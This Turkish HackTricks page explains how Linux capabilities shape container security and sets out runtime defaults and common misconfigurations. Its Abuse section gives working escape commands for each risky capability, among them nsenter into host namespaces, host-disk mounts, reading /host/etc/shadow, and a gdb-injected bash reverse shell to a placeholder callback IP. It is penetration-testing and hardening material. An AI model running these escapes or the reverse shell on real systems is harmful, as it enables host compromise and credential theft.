# Container'larda Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux capabilities, container security'nin en önemli parçalarından biridir; çünkü ince ama temel bir soruyu yanıtlar: **Bir container'ın içinde "root" olmak gerçekten ne anlama gelir?** Normal bir Linux sisteminde UID 0, tarihsel olarak çok geniş bir yetki kümesi anlamına gelirdi. Modern kernel'lerde bu yetki, capabilities adı verilen daha küçük birimlere ayrılmıştır. İlgili capabilities kaldırılmışsa bir process root olarak çalışsa bile birçok güçlü işlemi gerçekleştiremeyebilir. <sup>[[1]](#references)</sup>

Container'lar bu ayrımdan büyük ölçüde yararlanır. Uyumluluk veya basitlik nedenleriyle birçok workload hâlâ container içinde UID 0 olarak başlatılır. Capability'ler kaldırılmadığında bu durum fazlasıyla tehlikeli olurdu. Capability'ler kaldırıldığında ise container içindeki root process birçok sıradan container içi görevi gerçekleştirmeye devam ederken daha hassas kernel işlemleri reddedilebilir. Bu nedenle `uid=0(root)` gösteren bir container shell'i otomatik olarak "host root" veya "geniş kernel yetkisi" anlamına gelmez. Bu root kimliğinin gerçekte ne kadar değerli olduğunu capability set'leri belirler.

Linux capability referansının tamamı ve birçok abuse örneği için bkz.:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## İşleyiş

Capabilities; permitted, effective, inheritable, ambient ve bounding set'leri de dahil olmak üzere çeşitli set'lerde takip edilir. Birçok container assessment'ı için her set'in kesin kernel semantiği, daha doğrudan olan şu pratik sorudan daha az önemlidir: **Bu process şu anda hangi ayrıcalıklı işlemleri başarıyla gerçekleştirebilir ve gelecekte hangi privilege gain olanakları hâlâ mümkündür?** <sup>[[1]](#references)</sup>

Bunun önemli olmasının nedeni, birçok breakout tekniğinin aslında container problemleri kılığına girmiş capability problemleri olmasıdır. `CAP_SYS_ADMIN` içeren bir workload, normal bir container root process'inin dokunmaması gereken çok büyük miktarda kernel işlevine erişebilir. `CAP_NET_ADMIN` içeren bir workload, host network namespace'ini de paylaşıyorsa çok daha tehlikeli hâle gelir. `CAP_SYS_PTRACE` içeren bir workload, host PID paylaşımı üzerinden host process'lerini görebiliyorsa çok daha ilgi çekici hâle gelir. Docker veya Podman'da bu durum `--pid=host` olarak görünebilir; Kubernetes'te ise genellikle `hostPID: true` olarak görünür.

Başka bir deyişle, capability set'i izole şekilde değerlendirilemez. Namespaces, seccomp ve MAC policy ile birlikte ele alınmalıdır.

## Laboratuvar

Bir container içindeki capabilities'i incelemenin oldukça doğrudan bir yolu şudur:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Ayrıca daha kısıtlayıcı bir container'ı tüm capabilities'lerin eklendiği bir container ile karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Dar kapsamlı bir eklemenin etkisini görmek için her şeyi kaldırıp yalnızca tek bir capability eklemeyi deneyin:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Bu küçük deneyler, bir runtime'ın yalnızca "privileged" adlı bir boolean'ı açıp kapatmadığını göstermeye yardımcı olur. Runtime, process için kullanılabilir gerçek privilege yüzeyini şekillendirir.

## High-Risk Capabilities

Capabilities, yalnızca işlemleri **host tarafından yönetilen bir kaynağa** ulaştığında escape primitive'lerine dönüşür. Tekrarlayan yüksek riskli kombinasyonlar şunlardır:

- **`CAP_SYS_ADMIN`** ile birlikte bir host PID'si, block device veya writable kernel-control path. Hedef mount namespace'e katılmak ayrıca `CAP_SYS_CHROOT` gerektirir; block tabanlı bir filesystem'i mount etmek ise initial user namespace içinde `CAP_SYS_ADMIN` gerektirir.
- **`CAP_SYS_PTRACE`** ile birlikte host PID görünürlüğü ve attach edilebilen bir host process'i. ptrace injection için `CAP_SYS_ADMIN` gerekmez.
- **`CAP_DAC_OVERRIDE` veya `CAP_DAC_READ_SEARCH`** ile birlikte erişilebilir bir host filesystem'i. Bu capabilities farklı DAC kontrollerini bypass eder, ancak bir host filesystem görünümü oluşturmaz.
- **Initial user namespace içinde `CAP_SYS_MODULE`** ile birlikte kabul edilen ve kernel ile uyumlu bir module. Standart Linux containers node kernel'ını paylaşır; VM veya userspace-kernel runtime'ları bu sınırı değiştirir.
- **Initial user namespace içinde `CAP_MKNOD`** ile birlikte device cgroup'un zaten izin verdiği gerçek bir host device'ı. Bir node oluşturmak device cgroup'u bypass etmez.
- **`CAP_SYS_RAWIO`** ile birlikte dışarı açılmış ve kullanılabilir bir memory, I/O-port, PCI veya device-control interface'i.
- **`CAP_SYS_BOOT`** ile birlikte host reboot için initial PID namespace veya kernel replacement için kullanılabilir ve izin verilen bir kexec path.
- Host network namespace içinde doğrudan node network-state control için **`CAP_NET_ADMIN`**. **`CAP_NET_RAW`** protocol-specific bir escape'e katkıda bulunabilir, ancak raw sockets tek başına bir node shell'i değildir.

`CAP_SYS_CHROOT`, standalone bir escape capability olarak bilerek listelenmemiştir. Mount namespace `setns()` işlemi tarafından gerekli olabilir ve zaten erişilebilir olan bir host tree'yi kullanmayı kolaylaştırabilir, ancak `chroot()` tek başına bu tree'yi dışarı açmaz veya yeni filesystem permissions vermez. Benzer şekilde, `CAP_BPF` ve `CAP_PERFMON` güçlü telemetry ve kernel attack surface'lerini dışarı açar, ancak ayrı bir kernel flaw olmadığında normal işlemleri generic container escape'leri değildir.

## Runtime Usage

Docker, Podman, containerd-based stack'ler ve CRI-O capability kontrollerinin tümünü kullanır, ancak varsayılanlar ve management interface'leri farklıdır. Docker bunları `--cap-drop` ve `--cap-add` gibi flag'ler üzerinden doğrudan sunar. Podman benzer kontroller sunar ve bunları ek bir safety layer olarak rootless execution ile sıkça birleştirir. Kubernetes, capability additions ve drops işlemlerini Pod veya container `securityContext` üzerinden sunar; lower-level runtime'lar ortaya çıkan set'leri OCI runtime configuration içinde ifade eder. LXC ve Incus gibi system-container environment'ları da capability control'e dayanır, ancak daha geniş host integration'ları, operator'ların varsayılanları bir application container için yapacaklarından daha agresif biçimde gevşetmesine yol açabilir. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Aynı principle bunların tümü için geçerlidir: Teknik olarak verilebilen bir capability, mutlaka verilmesi gereken bir capability değildir. Gerçek dünyadaki birçok incident, bir workload daha strict bir configuration altında başarısız olduğunda ve team'in hızlı bir fix'e ihtiyaç duyduğunda, operator'ün yalnızca bir capability eklemesiyle başlar.

## Misconfigurations

En bariz hata, Docker/Podman-style CLI'larda **`--cap-add=ALL`** kullanmaktır, ancak tek hata bu değildir. Pratikte daha yaygın bir problem, namespace, seccomp ve mount etkileri anlaşılmadan, özellikle `CAP_SYS_ADMIN` olmak üzere bir veya iki son derece güçlü capability'nin "application'ı çalıştırmak" için verilmesidir. Bir diğer yaygın failure mode, ek capabilities'lerin host namespace sharing ile birleştirilmesidir. Docker veya Podman'da bu, `--pid=host`, `--network=host` veya `--userns=host` olarak görünebilir; Kubernetes'te eşdeğer exposure genellikle `hostPID: true` veya `hostNetwork: true` gibi workload settings üzerinden ortaya çıkar. Bu kombinasyonların her biri, capability'nin gerçekte neleri etkileyebileceğini değiştirir.

Administrator'ların bir workload tamamen `--privileged` olmadığı için hâlâ anlamlı biçimde kısıtlandığına inanması da yaygındır. Bazen bu doğrudur, ancak bazen effective posture zaten privileged'a yeterince yakındır ve bu ayrım operational olarak önemini kaybeder.

## Abuse

Effective sets, user-namespace mapping, seccomp state, namespaces, mounts ve devices bilgilerini kaydederek başlayın. Bu context olmadan bir capability adı escape'i kanıtlamaz:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespace'ler ve block device'lar

Host PID görünürlüğüyle `CAP_SYS_ADMIN`, host namespace'lerine girebilir. Mount-namespace işlemi ayrıca çağıranın user namespace'inde `CAP_SYS_CHROOT` gerektirir.

**Capability'yi ve confinement'ı kontrol edin:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Enumerate the target:** container/Pod yapılandırmasından veya unmistakable host process listinden host PID paylaşımını doğrulayın, ardından hedef namespace'leri inceleyin. Private PID namespace'lerde de yerel bir PID 1 bulunur; bu nedenle yalnızca bunun varlığı host PID paylaşımını kanıtlamaz.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Namespace path'ini exploit et:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Capability kontrolleri, hedeflerin sahibi olan user namespaces içinde başarılı olmalıdır. `--pid=host` veya Kubernetes `hostPID: true` görünürlük sağlar; capabilities sağlamaz.

Alternatif block-device yolu için adayları **enumerate** edin, ardından doğrulanmış adayı önce salt okunur olarak mount ederek erişilebilir filesystem'ı **exploit** edin:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Aygıt düğümü mevcut olmalı, device cgroup buna izin vermeli ve block-filesystem mount işlemleri initial user namespace içinde `CAP_SYS_ADMIN` gerektirir. `/host` konumuna önceden bind-mounted bir host root, `CAP_SYS_ADMIN` olmadan host erişimi sağlar; `chroot /host` yalnızca kolaylık sağlar ve ayrıca `CAP_SYS_CHROOT` gerektirir.

### Erişilebilir host root: doğrudan filesystem çalıştırma

Host root zaten `/host` konumuna mount edilmişse önce mount işlemini doğrulayın, ardından mevcut erişimi doğrudan kullanın. Bu yol `CAP_SYS_ADMIN`'a bağlı değildir:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
`chroot()` kullanılamıyorsa ancak host binary’si container’ın mimarisi ve loader’ı ile uyumluysa, genellikle bunun yerine mounted tree üzerinden çağrılabilir:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
`/host` altındaki doğrudan okuma ve yazma işlemleri zaten host-filesystem compromise anlamına gelir. `chroot()` kullanmak veya bir host binary'si çalıştırmak yalnızca bu erişimi daha kolay hâle getirir; bu işlemlerin hiçbiri host mount'ını oluşturmaz ya da salt-okunur bir mount'ı veya MAC policy'yi bypass etmez.

### `CAP_SYS_PTRACE`: host-process injection

Host PID görünürlüğü ve hedefin user namespace'inde `CAP_SYS_PTRACE` ile GDB, onaylanmış bir host process'ine `system()` çağrısı yaptırabilir. `CAP_SYS_ADMIN` gerekli değildir.

**Capability'yi ve attachment denetimlerini kontrol edin:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Gözden çıkarılabilir bir hedefi enumerate edin ve seçin:** yapılandırmadan veya açıkça görülebilen bir node işlem listesinden host PID paylaşımını doğrulayın; hiçbir zaman PID 1'i veya kritik bir daemon'u seçmeyin.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Seçili process'i exploit et:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Hedef attach edilebilir olmalı ve kullanılabilir bir `system()` sembolüne ve Bash payload path'ine sahip olmalıdır. Yama, non-dumpable state, seccomp, user namespaces ve MAC policy chain'i engelleyebilir. GDB, attach edildiğinde hedefi durdurur; bu nedenle yalnızca disposable bir lab process kullanın.

### `CAP_DAC_OVERRIDE` ve `CAP_DAC_READ_SEARCH`: korunan host dosyaları

Bu capabilities host filesystem'ını açığa çıkarmaz. `/host` zaten bir host mount'ıysa `CAP_DAC_READ_SEARCH`, read/search DAC kontrollerini bypass edebilir ve `CAP_DAC_OVERRIDE` ayrıca normal write kontrollerini bypass edebilir:

**Capabilities'leri kontrol edin:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Açığa çıkarılmış host dosya sistemini ve hedef izinlerini listeleyin:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**read ve write bypass'larını** disposable bir lab ortamında uygulayın:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Salt okunur bir mount ve LSM kuralları hâlâ geçerlidir. `CAP_DAC_READ_SEARCH`, `open_by_handle_at()` çağrısını da yetkilendirir; ancak Shocker gibi bir breakout için ayrıca aynı temel filesystem’e ait bir mount file descriptor, geçerli veya keşfedilebilir handle’lar, uyumlu bir filesystem/storage düzeni ve herhangi bir runtime veya LSM engelinin bulunmaması gerekir. Bu yetki, mount namespace dışındaki her filesystem’e keyfi erişim sağlamaz.

### `CAP_SYS_MODULE`: paylaşılan kernel üzerinde çalıştırma

Sıradan bir Linux container’ında kabul edilen bir module, paylaşılan host kernel’inde çalışır.

**Capability’yi ve user-namespace kapsamını kontrol edin:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Modül yükleme ön koşullarını sıralayın:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Yalnızca atılabilir bir node üzerinde, uyumlu ve önceden incelenmiş bir proof module ile exploit gerçekleştirin:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capability, initial user namespace içinde etkin olmalıdır. Kernel sürümü ve yapılandırması, module signatures, lockdown, seccomp ve LSM policy yüklemeye izin vermelidir. Kata, gVisor, Hyper-V isolation ve benzer runtime'lar, workload'un hangi kernel sınırına ulaştığını değiştirir.

### `CAP_MKNOD`: izin verilen bir device handle oluşturma

`CAP_MKNOD`, bir device node oluşturur ancak device cgroup'u bypass etmez. Device oluşturma namespaced değildir; bu nedenle capability, initial user namespace içinde etkin olmalıdır.

**Capability'yi ve user-namespace kapsamını kontrol edin:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Gerçek cihazları, major/minor numaralarını ve görünür herhangi bir cgroup-v1 allowlist'ini listeleyin:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Doğrulanmış bir ext-family adayını salt okunur olarak exploit edin:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Diğer dosya sistemleri için eşleşen bir salt okunur araç gerekir; cihazı bağlamak ayrıca `CAP_SYS_ADMIN` gerektirir. Oluşturulan düğümü açarken alınan `Operation not permitted` hatası genellikle device cgroup'un hâlâ erişimi engellediğini gösterir. cgroup v2 altında cihaz erişimi genellikle BPF ile uygulanır ve `devices.list` dosyası mevcut değildir; bu nedenle başarılı bir açma işlemi belirleyici testtir.

### `CAP_SYS_RAWIO`: açığa çıkarılmış raw-I/O arayüzü

Taşınabilir, genel bir payload yoktur: geçerli adresler ve etkiler donanıma ve kernel yapılandırmasına bağlıdır.

**Yeteneği ve user namespace kapsamını kontrol edin:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Erişime açık ham arayüzleri, donanımı ve sürücüleri numaralandırın:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploit yalnızca tanımlanan cihaz ve adres aralığı için onaylanmış bir proof ile gerçekleştirilmelidir.** `/dev/mem` lab tarafından onaylanmış arayüzse bu şablon, içeriğini yazdırmadan node-memory disclosure olduğunu kanıtlar:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Adres lab'in donanım haritasından gelmelidir; çünkü bazı MMIO bölgelerinin okunması yan etkilere neden olabilir. Genel amaçlı bir bellek-yazma komutu yanıltıcı ve güvenli olmayan bir yaklaşım olur: aynı adres bir makinede zararsızken başka bir makinede donanımı veya kernel belleğini kontrol edebilir. Device cgroups, filesystem permissions, katı `/dev/mem` kısıtlamaları, kernel lockdown, virtualization ve LSM policy genellikle kullanışlı erişimi engeller.

### `CAP_SYS_BOOT`: namespace yeniden başlatma veya kernel değiştirme

Özel bir PID namespace içinde `reboot()`, host'u yeniden başlatmak yerine o namespace'in init process'ini sonlandırır. Bu nedenle host reboot etkisi için genellikle host PID paylaşımı aracılığıyla initial PID namespace gerekir. Bir kexec yolu ayrıca uyumlu bir kernel image'ı ve izin veren lockdown/signature policy gerektirir:

**Capability'yi kontrol edin:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**PID-namespace ve kexec ön koşullarını numaralandırın:** Bir PID namespace bağlantısı tek başına bunun node'un initial namespace'i olup olmadığını göstermediğinden, workload yapılandırmasından host PID paylaşımını doğrulayın.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Yalnızca geçici bir lab node'unu yeniden başlatmanın açıkça egzersiz olarak belirtildiği durumlarda Exploit kullanın:**
```bash
sync
reboot -f
```
Bu yeteneği kanıtlamak amacıyla, paylaşılan bir node üzerinde bu komutu çalıştırmayın veya bir kernel yüklemeyin. Özel bir PID namespace içinde yalnızca o namespace'in init process'ini sonlandırır ve host üzerindeki etkiyi göstermez.

### `CAP_NET_ADMIN` ve `CAP_NET_RAW`: host network yolları

`CAP_NET_ADMIN` yalnızca mevcut network namespace'i etkiler.

**Capabilities ve yalıtımı kontrol edin:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Mevcut ağı listeleyin ve host networking'i workload yapılandırmasından doğrulayın:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**`CAP_NET_ADMIN`'i geri döndürülebilir şekilde kullanma:** host networking ile geçici arayüz bir node arayüzüdür.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW`, RAW ve PACKET socket'lerine izin verir ancak genel amaçlı bir host shell'i değildir. Belgelenmiş GCE zincirini **enumerate** etmek için metadata route'unu kontrol edin ve plaintext guest-agent trafiğinin gözlemlenebilir olup olmadığını yakalayın:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Eşleşen ön koşullar mevcutsa, [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) bölümünde belgelenen ortama özgü zinciri **exploit** edin: isteği ve sequence durumunu yakalayın, SSH key içeren sahte metadata yanıtını enjekte edin, ardından host erişimini doğrulayın. Bu zincir root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext GCE metadata trafiği ve race edilebilir bir guest-agent isteği gerektiriyordu; modern transport veya agent davranışı zinciri bozabilir.

## Kontroller

Capability kontrollerinin amacı yalnızca ham değerleri dökmek değil, sürecin mevcut namespace ve mount durumunu tehlikeli hâle getirecek kadar privilege'a sahip olup olmadığını anlamaktır.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Burada ilgi çekici olanlar:

- `capsh --print`, `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` veya `cap_sys_module` gibi yüksek riskli capabilities'leri tespit etmenin en kolay yoludur.
- `/proc/self/status` içindeki `CapEff` satırı, diğer setlerde kullanılabilir olabilecekleri değil, şu anda gerçekten etkin olanları gösterir.
- Container ayrıca host PID, network veya user namespace'lerini paylaşıyorsa ya da yazılabilir host mount'larına sahipse, capability dökümü çok daha önemli hâle gelir.

Ham capability bilgilerini topladıktan sonraki adım yorumlamadır. Process'in root olup olmadığını, user namespace'lerinin etkin olup olmadığını, host namespace'lerinin paylaşılıp paylaşılmadığını, seccomp'un enforcing durumda olup olmadığını ve AppArmor veya SELinux'un process'i hâlâ kısıtlayıp kısıtlamadığını değerlendirin. Bir capability seti tek başına hikâyenin yalnızca bir parçasıdır; ancak aynı görünen başlangıç noktasıyla bir container breakout'un neden çalıştığını ve diğerinin neden başarısız olduğunu çoğu zaman açıklayan kısım budur.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak azaltılmış capability seti | Docker, varsayılan bir capability allowlist'ini korur ve geri kalanları drop eder | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Varsayılan olarak azaltılmış capability seti | Podman container'ları varsayılan olarak unprivileged durumdadır ve azaltılmış bir capability modeli kullanır | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Değiştirilmediği sürece runtime varsayılanlarını devralır | `securityContext.capabilities` belirtilmezse container, runtime'dan gelen varsayılan capability setini alır | `securityContext.capabilities.add`, `drop: [\"ALL\"]` yapılmaması, `privileged: true` |
| Kubernetes altında containerd / CRI-O | Genellikle runtime varsayılanı | Etkin set, runtime'a ve Pod spec'ine bağlıdır | Kubernetes satırıyla aynıdır; doğrudan OCI/CRI yapılandırması da capabilities'leri açıkça ekleyebilir |

Kubernetes için önemli nokta, API'nin tek bir evrensel varsayılan capability seti tanımlamamasıdır. Pod capabilities eklemez veya drop etmezse workload, o node için runtime'ın varsayılanlarını devralır.

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container yapılandırması](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege ve Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Bir container için capabilities ayarlama](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` ve `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
